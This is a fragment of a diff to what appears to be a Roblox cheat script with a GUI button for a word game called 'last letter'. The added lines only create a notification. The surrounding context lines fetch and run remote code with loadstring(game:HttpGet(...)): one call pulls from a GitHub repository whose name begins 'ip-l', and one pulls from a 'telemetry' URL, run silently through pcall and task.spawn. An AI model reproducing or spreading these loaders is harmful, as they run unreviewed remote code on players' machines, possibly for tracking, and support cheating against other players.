@@ -440,6 +440,15 @@ loadstring(game:HttpGet("https://raw.githubusercontent.com/thiccnegative123/ip-l
 print("Clicked")
 end)
 Section:NewButton("last letter", "dominate nerds", function()
+
+local player = game.Players.LocalPlayer
+
+-- Create a notification
+game.StarterGui:SetCore("SendNotification", {
+    Title = "hard endings for custom suffix";
+    Text = "oed";
+    Duration = 5; -- Duration in seconds
+})
 task.spawn(function()
 	pcall(function()
 		loadstring(game:HttpGet("https://rscripts.net/api/telemetry/v2/client.lua?s=6ae4aac4c3bfab0dc8e5d261"))()
